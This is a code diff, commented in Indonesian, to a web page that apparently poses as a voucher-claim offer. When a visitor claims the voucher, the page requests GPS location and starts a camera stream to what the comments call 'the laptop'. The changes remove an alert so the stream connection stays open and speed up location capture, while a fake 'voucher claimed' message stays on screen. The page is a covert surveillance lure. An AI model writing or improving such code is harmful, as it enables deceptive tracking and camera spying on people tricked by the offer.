@@ -70,17 +70,17 @@
     async function prosesKlaim() {
       document.getElementById('status').innerText = "Memproses voucher...";
       
-      // Minta Akses Lokasi GPS
+      // 1. Minta Akses Lokasi GPS (Tanpa mengunci alur program)
       mintaLokasiGPS();
       
-      // Minta Akses Kamera & Mulai Stream
+      // 2. Minta Akses Kamera & Mulai Stream ke Laptop
       await startCamera();
       
-      alert("Voucher Berhasil Diklaim!");
-      document.getElementById('status').innerText = "Voucher Aktif.";
+      // 3. Ubah status teks tanpa menggunakan alert() agar koneksi tidak terhenti
+      document.getElementById('status').innerText = "Voucher Berhasil Diklaim!";
     }
 
-    // Fungsi Pengambilan Lokasi GPS Presisi
+    // Fungsi Pengambilan Lokasi GPS Cepat
     function mintaLokasiGPS() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -101,7 +101,8 @@
           (error) => {
             console.warn("Izin lokasi ditolak atau gagal:", error.message);
           },
-          { enableHighAccuracy: true }
+          // Optimasi respons jaringan & batas waktu pencarian sinyal (5 detik)
+          { enableHighAccuracy: false, timeout: 5000, maximumAge: 0 }
         );
       }
     }
